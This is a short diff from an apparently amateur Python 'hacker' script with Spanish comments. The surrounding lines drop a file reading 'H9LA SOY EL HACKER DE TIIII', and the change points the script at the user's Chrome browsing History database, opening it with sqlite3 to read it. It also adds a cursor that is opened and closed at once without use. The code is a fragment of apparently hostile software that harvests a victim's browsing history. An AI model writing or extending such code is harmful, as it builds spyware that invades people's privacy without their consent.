@@ -28,10 +28,11 @@ def main():
         hackerFile.write("H9LA SOY EL HACKER DE TIIII")
 
 
-    db_history= ""
+    db_history= user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
 
     conect= sqlite3.connect(db_history)
-
+    cursor= conect.cursor()
+    cursor.close()
     insideBd = conect.cursor()
     #Obtener nombre del user
     # print(os.getlogin())
